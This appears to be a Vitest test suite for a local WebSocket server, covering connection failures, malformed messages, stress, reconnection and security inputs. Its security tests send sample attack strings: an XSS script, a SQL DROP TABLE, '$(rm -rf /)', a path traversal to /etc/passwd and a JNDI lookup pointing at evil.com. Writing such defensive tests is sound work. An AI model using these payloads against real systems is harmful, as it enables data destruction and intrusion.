/**
 * Real-world WebSocket Error Handling Tests
 * Tests error scenarios, connection failures, and recovery mechanisms
 * Uses actual running WebSocket server for authentic error testing
 */

import { describe, it, expect, beforeAll } from 'vitest';
import WebSocket from 'ws';
import { setTimeout as delay } from 'timers/promises';

const WEBSOCKET_URL = 'ws://localhost:8080';
const HEALTH_URL = 'http://localhost:8080/health';
const TEST_TIMEOUT = 10000;

describe('Real-world WebSocket Error Handling Tests', () => {
  let isServerAvailable = false;

  beforeAll(async () => {
    try {
      const response = await fetch(HEALTH_URL);
      const health = await response.json();
      isServerAvailable = health.status === 'ok';
    } catch (error) {
      console.warn('WebSocket server not available for error tests');
      isServerAvailable = false;
    }
  });

  describe('Connection Error Scenarios', () => {
    it('should handle connection to non-existent endpoint', async () => {
      if (!isServerAvailable) {
        console.log('Skipping test - WebSocket server not available');
        return;
      }

      return new Promise<void>((resolve, reject) => {
        const timeout = global.setTimeout(() => {
          resolve(); // Timeout is expected for connection errors
        }, 3000);

        const ws = new WebSocket(`${WEBSOCKET_URL}/ws/nonexistent`);
        
        ws.on('open', () => {
          clearTimeout(timeout);
          ws.close();
          reject(new Error('Should not have connected to non-existent endpoint'));
        });
        
        ws.on('error', () => {
          clearTimeout(timeout);
          resolve(); // Expected error
        });
        
        ws.on('close', (code) => {
          clearTimeout(timeout);
          if (code !== 1000) {
            resolve(); // Connection was rejected as expected
          }
        });
      });
    }, TEST_TIMEOUT);

    it('should handle connection to non-existent server', async () => {
      return new Promise<void>((resolve, reject) => {
        const timeout = global.setTimeout(() => {
          resolve(); // Timeout expected for non-existent server
        }, 3000);

        try {
          const ws = new WebSocket('ws://localhost:9999/ws'); // Non-existent port
          
          ws.on('open', () => {
            clearTimeout(timeout);
            ws.close();
            reject(new Error('Should not have connected to non-existent server'));
          });
          
          ws.on('error', () => {
            clearTimeout(timeout);
            resolve(); // Expected error
          });
        } catch (error) {
          clearTimeout(timeout);
          resolve(); // Expected synchronous error
        }
      });
    }, TEST_TIMEOUT);

    it('should handle connection interruption during handshake', async () => {
      if (!isServerAvailable) {
        console.log('Skipping test - WebSocket server not available');
        return;
      }

      return new Promise<void>((resolve, reject) => {
        const timeout = global.setTimeout(() => {
          resolve(); // Test completed
        }, 3000);

        const ws = new WebSocket(`${WEBSOCKET_URL}/ws`);
        
        // Immediately close during connection attempt
        global.setTimeout(() => {
          if (ws.readyState === WebSocket.CONNECTING) {
            ws.close();
          }
        }, 10);
        
        ws.on('open', () => {
          clearTimeout(timeout);
          ws.close();
          resolve();
        });
        
        ws.on('error', () => {
          clearTimeout(timeout);
          resolve(); // Expected error due to early close
        });
        
        ws.on('close', () => {
          clearTimeout(timeout);
          resolve();
        });
      });
    }, TEST_TIMEOUT);

    it('should handle malformed WebSocket URLs', async () => {
      const malformedUrls = [
        'ws://',
        'ws://localhost',
        'ws://localhost:',
        'ws://localhost:abc/ws',
        'not-a-url',
        'http://localhost:8080/ws' // Wrong protocol
      ];

      for (const url of malformedUrls) {
        await new Promise<void>((resolve) => {
          const timeout = global.setTimeout(() => {
            resolve(); // Timeout expected for malformed URLs
          }, 1000);

          try {
            const ws = new WebSocket(url);
            
            ws.on('open', () => {
              clearTimeout(timeout);
              ws.close();
              resolve();
            });
            
            ws.on('error', () => {
              clearTimeout(timeout);
              resolve(); // Expected error
            });
          } catch (error) {
            clearTimeout(timeout);
            resolve(); // Expected synchronous error
          }
        });
      }
    }, TEST_TIMEOUT);
  });

  describe('Message Handling Errors', () => {
    let ws: WebSocket;

    beforeEach(async () => {
      if (!isServerAvailable) return;

      return new Promise<void>((resolve, reject) => {
        const timeout = global.setTimeout(() => {
          reject(new Error('Setup connection timeout'));
        }, 5000);

        ws = new WebSocket(`${WEBSOCKET_URL}/ws`);
        
        ws.on('open', () => {
          clearTimeout(timeout);
          resolve();
        });
        
        ws.on('error', (error) => {
          clearTimeout(timeout);
          reject(error);
        });
      });
    });

    afterEach(() => {
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.close();
      }
    });

    it('should handle malformed JSON messages gracefully', async () => {
      if (!isServerAvailable) {
        console.log('Skipping test - WebSocket server not available');
        return;
      }

      return new Promise<void>((resolve, reject) => {
        const timeout = global.setTimeout(() => {
          reject(new Error('Malformed JSON test timeout'));
        }, 5000);

        let welcomeReceived = false;
        let connectionStillAlive = false;

        ws.on('message', (data) => {
          try {
            const message = JSON.parse(data.toString());
            if (message.type === 'welcome') {
              welcomeReceived = true;
              // Send malformed JSON
              ws.send('invalid-json-{{}[[');
              
              // Wait then send valid message to test connection stability
              global.setTimeout(() => {
                if (ws.readyState === WebSocket.OPEN) {
                  ws.send(JSON.stringify({ type: 'test', data: 'recovery' }));
                }
              }, 1000);
            } else if (message.type === 'echo' && message.originalMessage.data === 'recovery') {
              connectionStillAlive = true;
              clearTimeout(timeout);
              expect(connectionStillAlive).toBe(true);
              expect(ws.readyState).toBe(WebSocket.OPEN);
              resolve();
            }
          } catch (error) {
            // Ignore JSON parse errors
          }
        });
        
        ws.on('close', () => {
          clearTimeout(timeout);
          if (!connectionStillAlive) {
            reject(new Error('Connection closed unexpectedly after malformed JSON'));
          }
        });
        
        ws.on('error', () => {
          // Don't fail on WebSocket errors - server should handle gracefully
        });
      });
    }, TEST_TIMEOUT);

    it('should handle oversized messages', async () => {
      if (!isServerAvailable) {
        console.log('Skipping test - WebSocket server not available');
        return;
      }

      return new Promise<void>((resolve, reject) => {
        const timeout = global.setTimeout(() => {
          reject(new Error('Oversized message test timeout'));
        }, 5000);

        let welcomeReceived = false;

        ws.on('message', (data) => {
          try {
            const message = JSON.parse(data.toString());
            if (message.type === 'welcome') {
              welcomeReceived = true;
              
              // Send oversized message (1MB+ JSON)
              const largeData = 'x'.repeat(1024 * 1024);
              const oversizedMessage = JSON.stringify({
                type: 'test',
                data: largeData
              });
              
              try {
                ws.send(oversizedMessage);
              } catch (error) {
                // Expected - message too large
                clearTimeout(timeout);
                resolve();
              }
              
              // If message was sent, wait a bit and check connection
              global.setTimeout(() => {
                if (ws.readyState === WebSocket.OPEN) {
                  clearTimeout(timeout);
                  resolve(); // Connection survived large message
                }
              }, 1000);
            }
          } catch (error) {
            // Ignore parse errors
          }
        });
        
        ws.on('error', () => {
          clearTimeout(timeout);
          resolve(); // Expected error from oversized message
        });
        
        ws.on('close', (code) => {
          clearTimeout(timeout);
          if (code === 1009) { // Message too big
            resolve();
          } else {
            reject(new Error(`Unexpected close code: ${code}`));
          }
        });
      });
    }, TEST_TIMEOUT);

    it('should handle rapid message bursts', async () => {
      if (!isServerAvailable) {
        console.log('Skipping test - WebSocket server not available');
        return;
      }

      return new Promise<void>((resolve, reject) => {
        const timeout = global.setTimeout(() => {
          reject(new Error('Message burst test timeout'));
        }, 8000);

        let welcomeReceived = false;
        let echoCount = 0;
        const burstSize = 50;

        ws.on('message', (data) => {
          try {
            const message = JSON.parse(data.toString());
            
            if (message.type === 'welcome') {
              welcomeReceived = true;
              
              // Send burst of messages
              for (let i = 0; i < burstSize; i++) {
                if (ws.readyState === WebSocket.OPEN) {
                  ws.send(JSON.stringify({
                    type: 'burst',
                    index: i,
                    timestamp: Date.now()
                  }));
                }
              }
            } else if (message.type === 'echo' && message.originalMessage.type === 'burst') {
              echoCount++;
              
              if (echoCount >= burstSize) {
                clearTimeout(timeout);
                expect(echoCount).toBeGreaterThanOrEqual(burstSize);
                expect(ws.readyState).toBe(WebSocket.OPEN);
                resolve();
              }
            }
          } catch (error) {
            // Ignore parse errors
          }
        });
        
        ws.on('error', (error) => {
          clearTimeout(timeout);
          reject(error);
        });
        
        ws.on('close', () => {
          clearTimeout(timeout);
          reject(new Error('Connection closed during burst test'));
        });
      });
    }, TEST_TIMEOUT);

    it('should handle concurrent connections with message floods', async () => {
      if (!isServerAvailable) {
        console.log('Skipping test - WebSocket server not available');
        return;
      }

      const connectionCount = 5;
      const messagesPerConnection = 10;
      const connections: WebSocket[] = [];
      const promises: Promise<void>[] = [];

      for (let i = 0; i < connectionCount; i++) {
        const promise = new Promise<void>((resolve, reject) => {
          const timeout = global.setTimeout(() => {
            reject(new Error(`Connection ${i} flood test timeout`));
          }, 8000);

          const ws = new WebSocket(`${WEBSOCKET_URL}/ws`);
          connections.push(ws);
          
          let welcomeReceived = false;
          let echoCount = 0;
          
          ws.on('open', () => {
            // Connection established
          });
          
          ws.on('message', (data) => {
            try {
              const message = JSON.parse(data.toString());
              
              if (message.type === 'welcome') {
                welcomeReceived = true;
                
                // Send flood of messages
                for (let j = 0; j < messagesPerConnection; j++) {
                  ws.send(JSON.stringify({
                    type: 'flood',
                    connectionId: i,
                    messageId: j
                  }));
                }
              } else if (message.type === 'echo' && message.originalMessage.type === 'flood') {
                echoCount++;
                
                if (echoCount >= messagesPerConnection) {
                  clearTimeout(timeout);
                  ws.close();
                  resolve();
                }
              }
            } catch (error) {
              // Ignore parse errors
            }
          });
          
          ws.on('error', (error) => {
            clearTimeout(timeout);
            reject(error);
          });
        });
        
        promises.push(promise);
      }

      await Promise.all(promises);
      
      // Clean up any remaining connections
      connections.forEach(ws => {
        if (ws.readyState === WebSocket.OPEN) {
          ws.close();
        }
      });
    }, TEST_TIMEOUT);
  });

  describe('Connection Recovery and Resilience', () => {
    it('should handle connection close and immediate reconnect', async () => {
      if (!isServerAvailable) {
        console.log('Skipping test - WebSocket server not available');
        return;
      }

      // First connection
      const ws1 = await new Promise<WebSocket>((resolve, reject) => {
        const timeout = global.setTimeout(() => reject(new Error('First connection timeout')), 5000);
        const ws = new WebSocket(`${WEBSOCKET_URL}/ws`);
        
        ws.on('open', () => {
          clearTimeout(timeout);
          resolve(ws);
        });
        
        ws.on('error', reject);
      });

      // Close first connection
      ws1.close();
      
      await new Promise<void>(resolve => {
        if (ws1.readyState === WebSocket.CLOSED) {
          resolve();
        } else {
          ws1.on('close', () => resolve());
        }
      });

      // Immediate reconnection
      const ws2 = await new Promise<WebSocket>((resolve, reject) => {
        const timeout = global.setTimeout(() => reject(new Error('Reconnection timeout')), 5000);
        const ws = new WebSocket(`${WEBSOCKET_URL}/ws`);
        
        ws.on('open', () => {
          clearTimeout(timeout);
          resolve(ws);
        });
        
        ws.on('error', reject);
      });

      expect(ws2.readyState).toBe(WebSocket.OPEN);
      ws2.close();
    }, TEST_TIMEOUT);

    it('should handle rapid connect/disconnect cycles', async () => {
      if (!isServerAvailable) {
        console.log('Skipping test - WebSocket server not available');
        return;
      }

      const cycleCount = 5;
      
      for (let i = 0; i < cycleCount; i++) {
        await new Promise<void>((resolve, reject) => {
          const timeout = global.setTimeout(() => {
            reject(new Error(`Cycle ${i} timeout`));
          }, 3000);

          const ws = new WebSocket(`${WEBSOCKET_URL}/ws`);
          
          ws.on('open', () => {
            // Close immediately after opening
            ws.close();
          });
          
          ws.on('close', () => {
            clearTimeout(timeout);
            resolve();
          });
          
          ws.on('error', (error) => {
            clearTimeout(timeout);
            reject(error);
          });
        });
        
        // Brief delay between cycles
        await delay(100);
      }
    }, TEST_TIMEOUT);

    it('should maintain server stability during stress test', async () => {
      if (!isServerAvailable) {
        console.log('Skipping test - WebSocket server not available');
        return;
      }

      // Check initial health
      const initialResponse = await fetch(HEALTH_URL);
      const initialHealth = await initialResponse.json();
      expect(initialHealth.status).toBe('ok');

      // Create multiple connections simultaneously
      const stressConnections = 10;
      const connections: WebSocket[] = [];
      const connectionPromises: Promise<void>[] = [];

      for (let i = 0; i < stressConnections; i++) {
        const promise = new Promise<void>((resolve, reject) => {
          const timeout = global.setTimeout(() => {
            reject(new Error(`Stress connection ${i} timeout`));
          }, 5000);

          const ws = new WebSocket(`${WEBSOCKET_URL}/ws`);
          connections.push(ws);
          
          ws.on('open', () => {
            clearTimeout(timeout);
            
            // Send some messages to create load
            for (let j = 0; j < 5; j++) {
              ws.send(JSON.stringify({ type: 'stress', id: i, msg: j }));
            }
            
            resolve();
          });
          
          ws.on('error', (error) => {
            clearTimeout(timeout);
            reject(error);
          });
        });
        
        connectionPromises.push(promise);
      }

      await Promise.all(connectionPromises);
      
      // Wait a bit for message processing
      await setTimeout(1000);
      
      // Check server is still healthy
      const midResponse = await fetch(HEALTH_URL);
      const midHealth = await midResponse.json();
      expect(midHealth.status).toBe('ok');
      
      // Close all connections
      connections.forEach(ws => ws.close());
      
      // Wait for cleanup
      await setTimeout(500);
      
      // Final health check
      const finalResponse = await fetch(HEALTH_URL);
      const finalHealth = await finalResponse.json();
      expect(finalHealth.status).toBe('ok');
    }, TEST_TIMEOUT);
  });

  describe('Security Error Scenarios', () => {
    it('should handle potential XSS payloads in messages', async () => {
      if (!isServerAvailable) {
        console.log('Skipping test - WebSocket server not available');
        return;
      }

      const ws = await new Promise<WebSocket>((resolve, reject) => {
        const timeout = global.setTimeout(() => reject(new Error('Connection timeout')), 5000);
        const ws = new WebSocket(`${WEBSOCKET_URL}/ws`);
        
        ws.on('open', () => {
          clearTimeout(timeout);
          resolve(ws);
        });
        
        ws.on('error', reject);
      });

      return new Promise<void>((resolve, reject) => {
        const timeout = global.setTimeout(() => {
          reject(new Error('XSS test timeout'));
        }, 5000);

        let welcomeReceived = false;

        ws.on('message', (data) => {
          try {
            const message = JSON.parse(data.toString());
            
            if (message.type === 'welcome') {
              welcomeReceived = true;
              
              // Send potential XSS payload
              const xssPayload = {
                type: 'test',
                data: '<script>alert("xss")</script>',
                comment: '<!-- malicious comment -->',
                style: 'javascript:alert("xss")'
              };
              
              ws.send(JSON.stringify(xssPayload));
            } else if (message.type === 'echo' && welcomeReceived) {
              clearTimeout(timeout);
              
              // Verify server handled the payload safely
              expect(ws.readyState).toBe(WebSocket.OPEN);
              expect(message.originalMessage.data).toContain('<script>');
              
              ws.close();
              resolve();
            }
          } catch (error) {
            clearTimeout(timeout);
            reject(error);
          }
        });
        
        ws.on('error', (error) => {
          clearTimeout(timeout);
          reject(error);
        });
      });
    }, TEST_TIMEOUT);

    it('should handle potential injection attempts', async () => {
      if (!isServerAvailable) {
        console.log('Skipping test - WebSocket server not available');
        return;
      }

      const injectionPayloads = [
        { type: 'sql', data: "'; DROP TABLE users; --" },
        { type: 'command', data: '$(rm -rf /)' },
        { type: 'path', data: '../../../etc/passwd' },
        { type: 'ldap', data: '${jndi:ldap://evil.com/a}' }
      ];

      const ws = await new Promise<WebSocket>((resolve, reject) => {
        const timeout = global.setTimeout(() => reject(new Error('Connection timeout')), 5000);
        const ws = new WebSocket(`${WEBSOCKET_URL}/ws`);
        
        ws.on('open', () => {
          clearTimeout(timeout);
          resolve(ws);
        });
        
        ws.on('error', reject);
      });

      for (const payload of injectionPayloads) {
        await new Promise<void>((resolve, reject) => {
          const timeout = global.setTimeout(() => {
            reject(new Error(`Injection test timeout for ${payload.type}`));
          }, 3000);

          let testComplete = false;

          const messageHandler = (data: Buffer) => {
            try {
              const message = JSON.parse(data.toString());
              
              if (message.type === 'echo' && message.originalMessage.type === payload.type) {
                testComplete = true;
                clearTimeout(timeout);
                
                // Server should have processed the message safely
                expect(ws.readyState).toBe(WebSocket.OPEN);
                expect(message.originalMessage.data).toBe(payload.data);
                
                ws.removeListener('message', messageHandler);
                resolve();
              }
            } catch (error) {
              if (!testComplete) {
                clearTimeout(timeout);
                ws.removeListener('message', messageHandler);
                reject(error);
              }
            }
          };

          ws.on('message', messageHandler);
          ws.send(JSON.stringify(payload));
        });
      }

      ws.close();
    }, TEST_TIMEOUT);
  });

  describe('Performance and Memory Leak Detection', () => {
    it('should not leak memory during connection churn', async () => {
      if (!isServerAvailable) {
        console.log('Skipping test - WebSocket server not available');
        return;
      }

      // Get initial memory baseline
      const initialResponse = await fetch(HEALTH_URL);
      const initialHealth = await initialResponse.json();
      
      // Perform connection churn
      const churnCycles = 10;
      const connectionsPerCycle = 5;
      
      for (let cycle = 0; cycle < churnCycles; cycle++) {
        const cycleConnections: WebSocket[] = [];
        
        // Create connections
        for (let i = 0; i < connectionsPerCycle; i++) {
          const ws = await new Promise<WebSocket>((resolve, reject) => {
            const timeout = global.setTimeout(() => reject(new Error('Churn connection timeout')), 3000);
            const ws = new WebSocket(`${WEBSOCKET_URL}/ws`);
            
            ws.on('open', () => {
              clearTimeout(timeout);
              resolve(ws);
            });
            
            ws.on('error', reject);
          });
          
          cycleConnections.push(ws);
        }
        
        // Send some messages
        cycleConnections.forEach((ws, i) => {
          for (let j = 0; j < 3; j++) {
            ws.send(JSON.stringify({ type: 'churn', cycle, connection: i, message: j }));
          }
        });
        
        // Wait a bit
        await delay(100);
        
        // Close all connections
        cycleConnections.forEach(ws => ws.close());
        
        // Wait for cleanup
        await delay(200);
      }
      
      // Check final health - server should still be stable
      const finalResponse = await fetch(HEALTH_URL);
      const finalHealth = await finalResponse.json();
      expect(finalHealth.status).toBe('ok');
      
      // Connection count should be back to baseline
      expect(finalHealth.websocket.endpoints.general.connections).toBe(0);
    }, TEST_TIMEOUT);

    it('should handle exponential backoff reconnection strategy', async () => {
      if (!isServerAvailable) {
        console.log('Skipping test - WebSocket server not available');
        return;
      }

      // Test exponential backoff logic (simulation)
      const backoffTimes = [];
      let attempt = 0;
      
      const calculateBackoff = (attemptNumber: number) => {
        const baseDelay = 1000; // 1 second
        const maxDelay = 30000; // 30 seconds
        const backoffMultiplier = 2;
        
        return Math.min(baseDelay * Math.pow(backoffMultiplier, attemptNumber), maxDelay);
      };
      
      // Test backoff calculation
      for (let i = 0; i < 6; i++) {
        backoffTimes.push(calculateBackoff(attempt++));
      }
      
      expect(backoffTimes[0]).toBe(1000);   // 1 second
      expect(backoffTimes[1]).toBe(2000);   // 2 seconds
      expect(backoffTimes[2]).toBe(4000);   // 4 seconds
      expect(backoffTimes[3]).toBe(8000);   // 8 seconds
      expect(backoffTimes[4]).toBe(16000);  // 16 seconds
      expect(backoffTimes[5]).toBe(30000);  // 30 seconds (capped)
      
      // Actually test reconnection with delays
      let reconnectAttempts = 0;
      const maxReconnectAttempts = 3;
      
      const attemptReconnect = async (): Promise<WebSocket> => {
        return new Promise((resolve, reject) => {
          if (reconnectAttempts >= maxReconnectAttempts) {
            reject(new Error('Max reconnection attempts reached'));
            return;
          }
          
          const backoffDelay = calculateBackoff(reconnectAttempts);
          reconnectAttempts++;
          
          global.setTimeout(() => {
            const ws = new WebSocket(`${WEBSOCKET_URL}/ws`);
            
            ws.on('open', () => {
              resolve(ws);
            });
            
            ws.on('error', () => {
              // Retry with exponential backoff
              attemptReconnect().then(resolve).catch(reject);
            });
          }, Math.min(backoffDelay, 1000)); // Speed up for testing
        });
      };
      
      const reconnectedWs = await attemptReconnect();
      expect(reconnectedWs.readyState).toBe(WebSocket.OPEN);
      reconnectedWs.close();
    }, TEST_TIMEOUT);
  });
});